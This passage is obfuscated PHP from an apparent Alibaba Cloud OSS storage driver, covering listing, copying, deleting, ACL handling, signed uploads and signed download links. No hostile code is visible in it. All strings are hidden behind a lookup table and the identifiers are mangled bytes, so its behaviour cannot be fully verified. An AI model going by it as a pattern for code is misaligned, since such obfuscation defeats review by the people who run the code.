$ÔÉ‡áÁ…[8]; $şã¼­ïü = $ÔÉ‡áÁ…[12]; $«£¸Ø = 1000; $’ñã¹¬ = $¥Â¿•îÚ = array(); while (!0) { check_abort(); $œçäí»— = array($ÔÉ‡áÁ…[1404] => $Ö˜Õ¹î¢, $ÔÉ‡áÁ…[1405] => $ÓĞ—‰™, $ÔÉ‡áÁ…[1406] => $«£¸Ø, $ÔÉ‡áÁ…[1407] => $şã¼­ïü); try { $‹®…„« = $this->client->listObjects($this->bucket, $œçäí»—); } catch (OSS\Core\OssException $Ëûù¨‚Ü) { break; } $şã¼­ïü = $‹®…„«->getNextMarker(); $à‡–í½‚ = $‹®…„«->getObjectList(); $Ï×ğ°ŸÖ = $‹®…„«->getPrefixList(); foreach ($à‡–í½‚ as $İï©…ş) { if ($İï©…ş->getKey() == $ÓĞ—‰™) { continue; } $Ì»à÷üş = $İï©…ş->getKey(); $şÑíÖÊª = $İï©…ş->getSize(); $¡‘è»òš = $İï©…ş->getLastModified(); $ˆè¶ ùÎ = $“¹ü‰Õ ? array($ÔÉ‡áÁ…[32] => $Ì»à÷üş, $ÔÉ‡áÁ…[76] => $şÑíÖÊª, $ÔÉ‡áÁ…[180] => strtotime($¡‘è»òš)) : $Ì»à÷üş; $°½ğ•­· = $şÑíÖÊª == 0 && substr($Ì»à÷üş, strlen($Ì»à÷üş) - 1, 1) == $ÔÉ‡áÁ…[8] ? !0 : !1; $‰‰šã Ã = array($ÔÉ‡áÁ…[76] => $şÑíÖÊª, $ÔÉ‡áÁ…[1408] => $şÑíÖÊª, $ÔÉ‡áÁ…[85] => strtotime($¡‘è»òš), $ÔÉ‡áÁ…[1409] => $¡‘è»òš); $this->cacheMethodInfoSet($Ì»à÷üş, $°½ğ•­·, $‰‰šã Ã); if ($°½ğ•­·) { $’ñã¹¬[] = $Ì»à÷üş; continue; } $¥Â¿•îÚ[] = $ˆè¶ ùÎ; } foreach ($Ï×ğ°ŸÖ as $Î÷ù–ÉØ) { $’ñã¹¬[] = $Î÷ù–ÉØ->getPrefix(); $this->cacheMethodInfoSet($Î÷ù–ÉØ->getPrefix(), !0); } if ($şã¼­ïü === $ÔÉ‡áÁ…[12]) { break; } } $this->cacheMethodInfoSet($ˆá³ĞÚ, !0); return array($ÔÉ‡áÁ…[82] => $’ñã¹¬, $ÔÉ‡áÁ…[83] => $¥Â¿•îÚ); } public function copyFile($¨ª‘×Õ¶, $øËŞØú) { $ĞÀÄù½± = $this->size($¨ª‘×Õ¶); if ($ĞÀÄù½± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¨ª‘×Õ¶, $this->bucket, $this->pathEncode($øËŞØú)); } catch (OSS\Core\OssException $Ö²¦˜îÂ) { return !1; } return $this->getPathOuter($øËŞØú); } $×‡ä§ìÙ = $this->multiCopyObject($¨ª‘×Õ¶, $øËŞØú, $ĞÀÄù½±); return $×‡ä§ìÙ ? $this->getPathOuter($øËŞØú) : !1; } private function multiCopyObject($–õ›¡§â, $ĞöÅÜçµ, $œÏí¸Ãˆ) { $¤¤ùõ¹Ê =& $_SERVER[ì™ı‰º¯]; try { $ ¶æó“È = array(); if ($ÅßÎÖÏÁ = $this->hashMd5($–õ›¡§â)) { $ ¶æó“È = array(OSS\OssClient::OSS_HEADERS => array($¤¤ùõ¹Ê[1410] => $ÅßÎÖÏÁ)); } $æ©ı«åã = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ĞöÅÜçµ), $ ¶æó“È); $­°º´“¶ = 1; $Šš‘Â›² = 0; $û¿¥†¹Ø = array(); $“ñÖ…ˆ = 1024 * 1024 * 10; $Şò÷Œ = $this->client->generateMultiuploadParts($œÏí¸Ãˆ, $“ñÖ…ˆ); foreach ($Şò÷Œ as $ëè¯©’Ê => $°½Ê¤·£) { $½÷ñ¬öÂ = $Šš‘Â›² + (int) $°½Ê¤·£[$¤¤ùõ¹Ê[1411]]; $–ÌÀœû = (int) $°½Ê¤·£[$¤¤ùõ¹Ê[337]] + $½÷ñ¬öÂ - 1; $ïš–½ÅØ = array($¤¤ùõ¹Ê[1412] => $½÷ñ¬öÂ, $¤¤ùõ¹Ê[1413] => $–ÌÀœû); $û¿¥†¹Ø[] = $this->client->uploadPartCopy($this->bucket, $–õ›¡§â, $this->bucket, $this->pathEncode($ĞöÅÜçµ), $­°º´“¶, $æ©ı«åã, $ïš–½ÅØ); $­°º´“¶ = $­°º´“¶ + 1; } $çÕ…‚Œ¥ = array(); foreach ($û¿¥†¹Ø as $ëè¯©’Ê => $Ú»è…•¼) { $çÕ…‚Œ¥[] = array($¤¤ùõ¹Ê[1414] => $ëè¯©’Ê + 1, $¤¤ùõ¹Ê[1415] => $Ú»è…•¼); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ĞöÅÜçµ), $æ©ı«åã, $çÕ…‚Œ¥); } catch (OSS\Core\OssException $ó“÷ŠÌÅ) { return !1; } return !0; } public function moveFile($¶€şÚÔ, $€®Ó¦·Å) { if ($this->copyFile($¶€şÚÔ, $€®Ó¦·Å)) { $this->remove($¶€şÚÔ); return $this->getPathOuter($€®Ó¦·Å); } return !1; } public function delFile($Ç­Í¼) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ç­Í¼)); } catch (OSS\Core\OssException $İ¤¾èÛª) { return !1; } return !0; } public function delFolder($ºÄ¾™œ‘) { $ƒáî– =& $_SERVER[ì™ı‰º¯]; if (!$this->exist($ºÄ¾™œ‘)) { return !0; } $this->listItemCache = !1; $ĞÔËØˆ = $this->fileList($ºÄ¾™œ‘); $this->listItemCache = !0; $Üğü¨©æ = trim($ºÄ¾™œ‘, $ƒáî–[8]) . $ƒáî–[8]; if (!empty($ºÄ¾™œ‘) && $ºÄ¾™œ‘ !== $ƒáî–[198] && !in_array($Üğü¨©æ, $ĞÔËØˆ[$ƒáî–[82]])) { $ĞÔËØˆ[$ƒáî–[82]][] = $Üğü¨©æ; } $“¶º€×Ñ = $this->delByBatch($ĞÔËØˆ[$ƒáî–[83]]); if (!$“¶º€×Ñ) { return !1; } $“¶º€×Ñ = $this->delByBatch($ĞÔËØˆ[$ƒáî–[82]]); if (!$“¶º€×Ñ) { return !1; } return $this->delFile($Üğü¨©æ); } private function delByBatch($½‰Ô¦È¸) { foreach (array_chunk($½‰Ô¦È¸, 1000) as $ëØôé²ó) { try { $this->client->deleteObjects($this->bucket, $ëØôé²ó); } catch (OSS\Core\OssException $Æïç½Ğ) { return !1; } } return !0; } public function rename($Á´¯·Ù, $ùÂ„°Œş) { return $this->renameObject($Á´¯·Ù, $ùÂ„°Œş); } private function fileInfo($ı¬êÁ¬, $Â›Ë†ƒ  = false, $ˆöÃ²­ = array()) { $¾ûÅöª¡ =& $_SERVER[ì™ı‰º¯]; $¯”üñ€ = array($¾ûÅöª¡[32] => $this->pathThis($ı¬êÁ¬), $¾ûÅöª¡[84] => $this->getPathOuter($ı¬êÁ¬), $¾ûÅöª¡[33] => $¾ûÅöª¡[200], $¾ûÅöª¡[76] => isset($ˆöÃ²­[$¾ûÅöª¡[76]]) ? $ˆöÃ²­[$¾ûÅöª¡[76]] : 0, $¾ûÅöª¡[174] => $this->ext($ı¬êÁ¬)); if ($Â›Ë†ƒ ) { return $¯”üñ€; } $¯”üñ€[$¾ûÅöª¡[201]] = $¯”üñ€[$¾ûÅöª¡[85]] = 0; $¯”üñ€[$¾ûÅöª¡[202]] = $¯”üñ€[$¾ûÅöª¡[203]] = !0; if (empty($ˆöÃ²­)) { $ŠÒÕ©İ¬ = $this->objectMeta($ı¬êÁ¬); if (!$ŠÒÕ©İ¬) { return $¯”üñ€; } $ˆöÃ²­ = array($¾ûÅöª¡[85] => strtotime($ŠÒÕ©İ¬[$¾ûÅöª¡[1409]]), $¾ûÅöª¡[76] => $ŠÒÕ©İ¬[$¾ûÅöª¡[1408]] + 0); } if (isset($ˆöÃ²­[$¾ûÅöª¡[76]])) { $¯”üñ€[$¾ûÅöª¡[76]] = $ˆöÃ²­[$¾ûÅöª¡[76]]; } if (isset($ˆöÃ²­[$¾ûÅöª¡[85]])) { $¯”üñ€[$¾ûÅöª¡[85]] = $ˆöÃ²­[$¾ûÅöª¡[85]]; } if (isset($ˆöÃ²­[$¾ûÅöª¡[180]]) && !trim($¯”üñ€[$¾ûÅöª¡[85]])) { $¯”üñ€[$¾ûÅöª¡[85]] = $ˆöÃ²­[$¾ûÅöª¡[180]]; } return $¯”üñ€; } private function folderInfo($õùó§˜, $üª»š = false, $û”‚›Æ = array()) { $°Ê§Îà§ =& $_SERVER[ì™ı‰º¯]; $…ÏÆŞ…Ş = array($°Ê§Îà§[32] => $this->pathThis($õùó§˜), $°Ê§Îà§[84] => $this->getPathOuter($°Ê§Îà§[8] . $õùó§˜), $°Ê§Îà§[33] => $°Ê§Îà§[75]); if ($üª»š) { return $…ÏÆŞ…Ş; } $…ÏÆŞ…Ş[$°Ê§Îà§[201]] = $…ÏÆŞ…Ş[$°Ê§Îà§[85]] = 0; $…ÏÆŞ…Ş[$°Ê§Îà§[202]] = $…ÏÆŞ…Ş[$°Ê§Îà§[203]] = !0; if (empty($û”‚›Æ)) { $õùó§˜ = rtrim($õùó§˜, $°Ê§Îà§[8]) . $°Ê§Îà§[8]; $§ª¸ŞÈ¬ = $this->objectMeta($õùó§˜); if (!$§ª¸ŞÈ¬) { return $…ÏÆŞ…Ş; } $û”‚›Æ = array($°Ê§Îà§[201] => $§ª¸ŞÈ¬[$°Ê§Îà§[502]][$°Ê§Îà§[1416]], $°Ê§Îà§[85] => strtotime($§ª¸ŞÈ¬[$°Ê§Îà§[1409]])); } if (isset($û”‚›Æ[$°Ê§Îà§[85]])) { $…ÏÆŞ…Ş[$°Ê§Îà§[85]] = $û”‚›Æ[$°Ê§Îà§[85]]; } if (isset($û”‚›Æ[$°Ê§Îà§[201]])) { $…ÏÆŞ…Ş[$°Ê§Îà§[201]] = $û”‚›Æ[$°Ê§Îà§[201]]; } return $…ÏÆŞ…Ş; } public function listPath($ÏáâŞô, $¶ØäÜ’ú = false) { $‹Çœ©òš =& $_SERVER[ì™ı‰º¯]; $ÖË„½Ş = $this->fileList($ÏáâŞô, $‹Çœ©òš[8], !0); foreach ($ÖË„½Ş[$‹Çœ©òš[82]] as $ˆÊâ“¯è => $Èˆôşò) { $ÖË„½Ş[$‹Çœ©òš[82]][$ˆÊâ“¯è] = $this->folderInfo($Èˆôşò, $¶ØäÜ’ú, $Èˆôşò); } foreach ($ÖË„½Ş[$‹Çœ©òš[83]] as $ˆÊâ“¯è => $Èˆôşò) { $ÖË„½Ş[$‹Çœ©òš[83]][$ˆÊâ“¯è] = $this->fileInfo($Èˆôşò[$‹Çœ©òš[32]], $¶ØäÜ’ú, $Èˆôşò); } return $ÖË„½Ş; } protected function infoChildren($†Å«äÆ , &$¬»çöÁß) { $™×á­ãÌ =& $_SERVER[ì™ı‰º¯]; $øˆ²üÎ = $this->fileList($†Å«äÆ , $™×á­ãÌ[12], !0); $¬»çöÁß[$™×á­ãÌ[78]] += count($øˆ²üÎ[$™×á­ãÌ[82]]); $¬»çöÁß[$™×á­ãÌ[77]] += count($øˆ²üÎ[$™×á­ãÌ[83]]); foreach ($øˆ²üÎ[$™×á­ãÌ[83]] as $¾û®â) { if (!$¾û®â || !$¾û®â[$™×á­ãÌ[76]]) { continue; } $¬»çöÁß[$™×á­ãÌ[76]] += $¾û®â[$™×á­ãÌ[76]]; } } public function has($å½÷Ûû, $ü†öëî½ = false, $‘šïÑ£ = true) { $ùÎ…ÎŞ„ =& $_SERVER[ì™ı‰º¯]; $å½÷Ûû = trim($å½÷Ûû, $ùÎ…ÎŞ„[8]); $ĞÔ›—´ = empty($å½÷Ûû) && $å½÷Ûû !== $ùÎ…ÎŞ„[198] ? $ùÎ…ÎŞ„[12] : $å½÷Ûû . $ùÎ…ÎŞ„[8]; $è½Úú¶ = $ùÎ…ÎŞ„[12]; $¾¦¬‘êÍ = 500; $ò“ À‘ = $”˜–¨ = 0; while (!0) { check_abort(); $Ğ£æ˜© = array($ùÎ…ÎŞ„[1404] => $ùÎ…ÎŞ„[8], $ùÎ…ÎŞ„[1405] => $ĞÔ›—´, $ùÎ…ÎŞ„[1406] => $¾¦¬‘êÍ, $ùÎ…ÎŞ„[1407] => $è½Úú¶); try { $’”âÆâñ = $this->client->listObjects($this->bucket, $Ğ£æ˜©); } catch (OSS\Core\OssException $·äƒ’­¿) { break; } $è½Úú¶ = $’”âÆâñ->getNextMarker(); $Öáå÷Ñ— = $’”âÆâñ->getObjectList(); $—Æ²äı = $’”âÆâñ->getPrefixList(); if ($ü†öëî½) { if (count($Öáå÷Ñ—) > 1 || count($Öáå÷Ñ—) == 1 && $Öáå÷Ñ—[0]->getKey() != $ĞÔ›—´) { $ò“ À‘ += count($Öáå÷Ñ—) - 1; } if (!empty($—Æ²äı)) { $”˜–¨ += count($—Æ²äı); } if ($è½Úú¶ === $ùÎ…ÎŞ„[12]) { break; } continue; } if ($‘šïÑ£) { if (!empty($Öáå÷Ñ—)) { if (count($Öáå÷Ñ—) > 1 || $Öáå÷Ñ—[0]->getKey() != $ĞÔ›—´) { return !0; } } } else { if (!empty($—Æ²äı)) { return !0; } } if ($è½Úú¶ === $ùÎ…ÎŞ„[12]) { break; } } if ($ü†öëî½) { return array($ùÎ…ÎŞ„[207] => $ò“ À‘, $ùÎ…ÎŞ„[208] => $”˜–¨); } return !1; } public function listAll($‡ì¬Ä¬) { $ã§–ÙÑı =& $_SERVER[ì™ı‰º¯]; $­¢Â€šÛ = $this->fileList($‡ì¬Ä¬, $ã§–ÙÑı[12], !0); $éâ­øºÜ = array_to_keyvalue($­¢Â€šÛ[$ã§–ÙÑı[83]], $ã§–ÙÑı[32]); foreach ($­¢Â€šÛ[$ã§–ÙÑı[82]] as $–·ÌªÙ) { if (is_string($–·ÌªÙ)) { $éâ­øºÜ[$–·ÌªÙ] = array($ã§–ÙÑı[76] => 0); } } return $this->listAllFiles($‡ì¬Ä¬, $éâ­øºÜ); } public function canRead($Œù¾¦Ò) { $¸œÙşİ„ =& $_SERVER[ì™ı‰º¯]; $¤ª³¡ñ§ = $this->pathAcl($Œù¾¦Ò); return $¤ª³¡ñ§ == $¸œÙşİ„[1417] || $¤ª³¡ñ§ == $¸œÙşİ„[547] ? !0 : !1; } public function canWrite($›÷ÅÂ‹) { $«·ğ°íñ = $this->pathAcl($›÷ÅÂ‹); return $«·ğ°íñ == $_SERVER[ì™ı‰º¯][547] ? !0 : !1; } public function pathAcl($€ëéËŠ¦) { $†˜‘º»Û =& $_SERVER[ì™ı‰º¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $‰†˜Åö³ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($€ëéËŠ¦)); } catch (OSS\Core\OssException $˜‘§ô®) { return !1; } $­ô‰áŒ = $‰†˜Åö³ == $†˜‘º»Û[37] ? $this->bucketAcl : $‰†˜Åö³; if ($­ô‰áŒ == $†˜‘º»Û[1418]) { return $†˜‘º»Û[1417]; } if ($­ô‰áŒ == $†˜‘º»Û[1419]) { return $†˜‘º»Û[547]; } return $­ô‰áŒ; } private function chmodPath($‰÷öÕÀõ, $Èê„©»† = '') { $šìß Ò‘ =& $_SERVER[ì™ı‰º¯]; $ùè¢ˆ²ğ = empty($Èê„©»†) ? $šìß Ò‘[1419] : $Èê„©»†; $×‚°ö½‹ = array($šìß Ò‘[37], $šìß Ò‘[199], $šìß Ò‘[1418], $šìß Ò‘[1419]); if (!in_array($ùè¢ˆ²ğ, $×‚°ö½‹)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($‰÷öÕÀõ), $ùè¢ˆ²ğ); } catch (OSS\Core\OssException $â‰¼›è±) { return !1; } return !0; } public function getContent($™œèÚı) { return $this->fileSubstr($™œèÚı, -1); } public function setContent($¦şÉ¢¬¡, $Áòˆ³åê = '') { $Õš’ËÏ¬ =& $_SERVER[ì™ı‰º¯]; try { $—ãû™Ã­ = $this->trafficLimit($Õš’ËÏ¬[1420]); $ÈÀ•š®º = $this->client->putObject($this->bucket, $this->pathEncode($¦şÉ¢¬¡), $Áòˆ³åê, $—ãû™Ã­); } catch (OSS\Core\OssException $•ÇŒ²ÆÜ) { return !1; } $”¿âóİ„ = array($Õš’ËÏ¬[1410] => trim($ÈÀ•š®º[$Õš’ËÏ¬[1421]], $Õš’ËÏ¬[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¦şÉ¢¬¡))); $this->updateObjMeta($¦şÉ¢¬¡, $”¿âóİ„); return isset($ÈÀ•š®º[$Õš’ËÏ¬[1422]][$Õš’ËÏ¬[1369]]) ? !0 : !1; } private function updateObjMeta($Ñ´‘òÃˆ, $éÇàıÍ…) { $Ñ´‘òÃˆ = $this->pathEncode($Ñ´‘òÃˆ); try { $¤˜ü•™Æ = array(OSS\OssClient::OSS_HEADERS => $éÇàıÍ…); $this->client->copyObject($this->bucket, $Ñ´‘òÃˆ, $this->bucket, $Ñ´‘òÃˆ, $¤˜ü•™Æ); } catch (OSS\Core\OssException $¬±Ãèç) { return !1; } return !0; } public function upload($Íç÷Ÿ°, $ÛŠ¸¶ü¢, $Ê±˜ä»¶ = false, $ìèŒéáÙ = REPEAT_REPLACE) { $Èº÷ÄÀÀ =& $_SERVER[ì™ı‰º¯]; $ıúÁâµİ = trim($Íç÷Ÿ°, $Èº÷ÄÀÀ[8]); $Ù² Ÿˆñ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Èº÷ÄÀÀ[1410] => @md5_file($ÛŠ¸¶ü¢)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Íç÷Ÿ°))); $Ù² Ÿˆñ = $this->trafficLimit($Èº÷ÄÀÀ[1420], $Ù² Ÿˆñ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ıúÁâµİ), $ÛŠ¸¶ü¢, $Ù² Ÿˆñ); } catch (OSS\Core\OssException $§¬Ï°àƒ) { return !1; } return $this->getPathOuter($Íç÷Ÿ°); } public function getHost() { $Ñ€»Á¢Í =& $_SERVER[ì™ı‰º¯]; $ë“Ñ‘¢¦ = explode($Ñ€»Á¢Í[184], parent::getHost()); return $ë“Ñ‘¢¦[0] . $Ñ€»Á¢Í[184] . $this->bucket . $Ñ€»Á¢Í[10] . $ë“Ñ‘¢¦[1]; } public function uploadFormData($Ù›£ş, $ñ³ş¯Û = 3600) { $ÒîË½ªÀ =& $_SERVER[ì™ı‰º¯]; if (!($ì Öä¤ = $this->getHost())) { return !1; } $•”°·ßû = $ñ³ş¯Û; $œ“Éğ‡Ê = date($ÒîË½ªÀ[1423], time() + $•”°·ßû); $ÛØ…Ì¯ü = new DateTime($œ“Éğ‡Ê); $Ú‡î€ÊÇ = $ÛØ…Ì¯ü->format(DateTime::ISO8601); $¨¾Êƒ”é = strpos($Ú‡î€ÊÇ, $ÒîË½ªÀ[296]); $Ú‡î€ÊÇ = substr($Ú‡î€ÊÇ, 0, $¨¾Êƒ”é) . $ÒîË½ªÀ[1424]; $ˆÆˆ›æ = 1048576000 * 5; $Ç‹âöÖÁ = $this->pathFather($Ù›£ş); $£”¥ß¿ = array($ÒîË½ªÀ[1323] => $Ú‡î€ÊÇ, $ÒîË½ªÀ[1324] => array(array($ÒîË½ªÀ[1425], 0, $ˆÆˆ›æ), array($ÒîË½ªÀ[1327], $ÒîË½ªÀ[1328], $Ç‹âöÖÁ))); $À©—Ïò = base64_encode(json_encode($£”¥ß¿)); $¹³Ú¦Ë = base64_encode(hash_hmac($ÒîË½ªÀ[232], $À©—Ïò, $this->secret, !0)); $ı›Ó»ö“ = array($ÒîË½ªÀ[1333] => $À©—Ïò, $ÒîË½ªÀ[1426] => $this->accessKey, $ÒîË½ªÀ[1329] => $ÒîË½ªÀ[1321], $ÒîË½ªÀ[1427] => $¹³Ú¦Ë, $ÒîË½ªÀ[182] => $ì Öä¤); $ı›Ó»ö“ = $this->trafficLimit($ÒîË½ªÀ[1420], $ı›Ó»ö“); return $ı›Ó»ö“; } public function multiUploadFormData($–Ï¾îŠà, $°˜³æí€ = 3600) { $Àóë¬Şˆ =& $_SERVER[ì™ı‰º¯]; if (!($é·´¢½ = $this->getHost())) { return !1; } $øÕö“Ã = $this->trafficLimit($Àóë¬Şˆ[1420]); $©…ï‹ŞÛ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($–Ï¾îŠà), $øÕö“Ã); return array($Àóë¬Şˆ[223] => $©…ï‹ŞÛ, $Àóë¬Şˆ[182] => $é·´¢½ . $Àóë¬Şˆ[8] . $this->pathEncode($–Ï¾îŠà), $Àóë¬Şˆ[224] => gmdate($Àóë¬Şˆ[1428]), $Àóë¬Şˆ[94] => $–Ï¾îŠà); } public function multiUploadAuthData($®Á’èé™, $®üÎá²ƒ = array()) { $ıøğéñ§ =& $_SERVER[ì™ı‰º¯]; $â•õÅÆ± = isset($®üÎá²ƒ[$ıøğéñ§[224]]) ? $®üÎá²ƒ[$ıøğéñ§[224]] : gmdate($ıøğéñ§[1428]); $ê³À¶Ï = isset($®üÎá²ƒ[$ıøğéñ§[174]]) ? $®üÎá²ƒ[$ıøğéñ§[174]] : $ıøğéñ§[12]; $Äœ²ó®ı = $®Á’èé™; if (isset($®üÎá²ƒ[$ıøğéñ§[94]])) { $Äœ²ó®ı = $®üÎá²ƒ[$ıøğéñ§[94]]; unset($®üÎá²ƒ[$ıøğéñ§[94]]); } if (isset($®üÎá²ƒ[$ıøğéñ§[225]])) { $®üÎá²ƒ[$ıøğéñ§[224]] = $â•õÅÆ±; return $this->listUploadParts($Äœ²ó®ı, $®üÎá²ƒ); } $û¿çšù… = array($ıøğéñ§[226], $ıøğéñ§[12], $ıøğéñ§[120], $â•õÅÆ±, "\x78\55\157\x73\x73\x2d\144\141\x74\x65\72{$â•õÅÆ±}", $ıøğéñ§[8] . $this->bucket . $ıøğéñ§[8] . $Äœ²ó®ı . $ê³À¶Ï); if (strpos($ê³À¶Ï, $ıøğéñ§[227]) === 0) { $û¿çšù…[0] = $ıøğéñ§[228]; if ($–óÒØ‹ = $this->trafficLimit($ıøğéñ§[1420])) { $Äœ²ó®ı = $ıøğéñ§[1429]; array_splice($û¿çšù…, 5, 0, $Äœ²ó®ı . $ıøğéñ§[4] . $–óÒØ‹[$Äœ²ó®ı]); } } if (isset($®üÎá²ƒ[$ıøğéñ§[229]]) && $®üÎá²ƒ[$ıøğéñ§[229]] == $ıøğéñ§[230]) { $û¿çšù…[0] = $ıøğéñ§[230]; } if (!empty($®üÎá²ƒ[$ıøğéñ§[1430]])) { $ÁìŒ×ã = array_merge(array($û¿çšù…[4]), $®üÎá²ƒ[$ıøğéñ§[1430]]); sort($ÁìŒ×ã); $û¿çšù…[4] = implode($ıøğéñ§[231], $ÁìŒ×ã); } $õëí–ç = implode($ıøğéñ§[231], $û¿çšù…); $Ü§æµŞü = base64_encode(hash_hmac($ıøğéñ§[232], $õëí–ç, $this->secret, !0)); $¡´€§¼ = $ıøğéñ§[1394] . $this->accessKey . $ıøğéñ§[4] . $Ü§æµŞü; if (strpos($ê³À¶Ï, $ıøğéñ§[227]) === 0) { $¡´€§¼ = array($ıøğéñ§[234] => $¡´€§¼, $ıøğéñ§[224] => $â•õÅÆ±); if ($–óÒØ‹) { $¡´€§¼ = array_merge($¡´€§¼, $–óÒØ‹); } } return $¡´€§¼; } public function listUploadParts($âÌ¯±×, $ÓÕÄ“Ü) { $´á‡È´¾ =& $_SERVER[ì™ı‰º¯]; $Œ§¨–£ƒ = parse_url_query($ÓÕÄ“Ü[$´á‡È´¾[174]]); $œ‚‰´ıë = $this->client->listParts($this->bucket, $this->pathEncode($âÌ¯±×), $Œ§¨–£ƒ[$´á‡È´¾[223]]); $éŒ¹—ö = $œ‚‰´ıë->getListPart(); $É‹³ã› = array(); foreach ($éŒ¹—ö as $é¤õ) { $É‹³ã›[] = array($´á‡È´¾[1414] => $é¤õ->getPartNumber(), $´á‡È´¾[1415] => trim($é¤õ->getETag(), $´á‡È´¾[118])); } unset($ÓÕÄ“Ü[$´á‡È´¾[225]], $ÓÕÄ“Ü[$´á‡È´¾[229]]); $·í‰­À = $this->multiUploadAuthData($âÌ¯±×, $ÓÕÄ“Ü); if (empty($·í‰­À)) { return !1; } return array($´á‡È´¾[234] => $·í‰­À, $´á‡È´¾[224] => $ÓÕÄ“Ü[$´á‡È´¾[224]], $´á‡È´¾[236] => $É‹³ã›); } public function download($ÏãÆÚùÊ, $üø’üíê) { if ($this->isFolder($ÏãÆÚùÊ)) { return !1; } try { $¡î¿Ö = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $üø’üíê); $¡î¿Ö = $this->trafficLimit($_SERVER[ì™ı‰º¯][109], $¡î¿Ö); $this->client->getObject($this->bucket, $this->pathEncode($ÏãÆÚùÊ), $¡î¿Ö); } catch (OSS\Core\OssException $Ã®”Õª) { return !1; } return $üø’üíê; } public function fileSubstr($÷¸ÇÆ±™, $…ßÛåˆ» = 0, $Œı¨²À… = false) { if ($…ßÛåˆ» === -1) { $³š°ä’¼ = array(); } else { if ($Œı¨²À… === !1) { $â°¸Ôü = $this->size($÷¸ÇÆ±™); } else { $â°¸Ôü = $…ßÛåˆ» + $Œı¨²À… - 1; } $³š°ä’¼ = array(OSS\OssClient::OSS_RANGE => "{$…ßÛåˆ»}\x2d{$â°¸Ôü}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($÷¸ÇÆ±™), $³š°ä’¼); } catch (OSS\Core\OssException $ÃãÎìéÌ) { think_exception($ÃãÎìéÌ->getMessage()); return !1; } } private function trafficLimit($à‹Ü›, $Á‡¢‰±‘ = array()) { $Úö‡òî¸ =& $_SERVER[ì™ı‰º¯]; if ($à‹Ü› == $Úö‡òî¸[1420] && $this->isUploadServer() || $à‹Ü› == $Úö‡òî¸[109] && $this->isFileOutServer()) { return $Á‡¢‰±‘; } $Ì¼ÎÖõÄ = floatval($GLOBALS[$Úö‡òî¸[6]][$Úö‡òî¸[89]][$Úö‡òî¸[107]][$à‹Ü›]) * 1024 * 1024 * 8; if (!$Ì¼ÎÖõÄ) { return $Á‡¢‰±‘; } $Ì¼ÎÖõÄ = $Ì¼ÎÖõÄ < 819200 ? 819200 : ($Ì¼ÎÖõÄ > 838860800 ? 838860800 : $Ì¼ÎÖõÄ); $Á‡¢‰±‘[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ì¼ÎÖõÄ); return $Á‡¢‰±‘; } public function link($åşÀÉ’ë, $Ó•ÚÎ = array()) { $“Ò£Ù°ª =& $_SERVER[ì™ı‰º¯]; if (!$this->exist($åşÀÉ’ë) || $this->isFolder($åşÀÉ’ë)) { return !1; } try { $Ó•ÚÎ = $this->trafficLimit($“Ò£Ù°ª[109], $Ó•ÚÎ); $Ûß†Áôò = $this->client->signUrl($this->bucket, $this->pathEncode($åşÀÉ’ë), 3600 * 12, $“Ò£Ù°ª[230], $Ó•ÚÎ); return $this->getCdnLink($Ûß†Áôò); } catch (OSS\Core\OssException $Ü¤á¹Ñœ) { return !1; } } public function fileOut($‘£äğ“Ñ, $êßÔç = false, $íé•ªíº = false, $Ôë×ÆøÑ = '') { $ÙİâÀ‹Ù =& $_SERVER[ì™ı‰º¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($‘£äğ“Ñ, $êßÔç, $íé•ªíº, $Ôë×ÆøÑ); } if (!$íé•ªíº) { $íé•ªíº = $this->pathThis($‘£äğ“Ñ); } $íé•ªíº = rawurlencode($íé•ªíº); $«‘åş  = get_file_mime(get_path_ext($íé•ªíº)); if ($«‘åş  == $ÙİâÀ‹Ù[217]) { return parent::fileOut($‘£äğ“Ñ, $êßÔç, $íé•ªíº, $Ôë×ÆøÑ); } $êßÔç = $êßÔç ? $ÙİâÀ‹Ù[1431] : $ÙİâÀ‹Ù[1432]; $ÂòÌÉ¹› = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÙİâÀ‹Ù[1433] . rawurlencode("{$êßÔç}\x3b\146\151\x6c\145\x6e\141\155\x65\x3d{$íé•ªíº}")); $ÂòÌÉ¹›[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÙİâÀ‹Ù[1434] . rawurlencode($«‘åş ); $ê§ö¿ç¸ = $this->link($‘£äğ“Ñ, $ÂòÌÉ¹›); $this->fileOutLink($ê§ö¿ç¸); } public function fileOutServer($‹Ï´‚„‹, $£†¥ª©ä = false, $Öúùâ®€ = false, $‚Ñ‚ï—‚ = '') { parent::fileOut($‹Ï´‚„‹, $£†¥ª©ä, $Öúùâ®€, $‚Ñ‚ï—‚); } public function fileOutImage($üÓ˜ûÏ, $í˜ÌÎ¡© = 250) { $Ş‘µìĞ÷ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ì™ı‰º¯][1435] . $í˜ÌÎ¡©); $×Ì¢Œ = $this->link($üÓ˜ûÏ, $Ş‘µìĞ÷); $this->fileOutLink($×Ì¢Œ); } public function fileOutImageServer($½€‚ãÆ°, $©Ù˜Æšş = 250) { parent::fileOutImage($½€‚ãÆ°, $©Ù˜Æšş); } public function fileOutLink($şƒ±§Å³) { $şƒãã =& $_SERVER[ì™ı‰º¯]; if (!$this->isCdnHost() && substr($şƒ±§Å³, 0, 7) == $şƒãã[1336]) { $şƒ±§Å³ = $şƒãã[1337] . substr($şƒ±§Å³, 7); } header($şƒãã[161] . $şƒ±§Å³); die; } public function hashMd5($Æ¾ôÏ•ı, $ÜÂÓª† = '') { $å–çÌ =& $_SERVER[ì™ı‰º¯]; 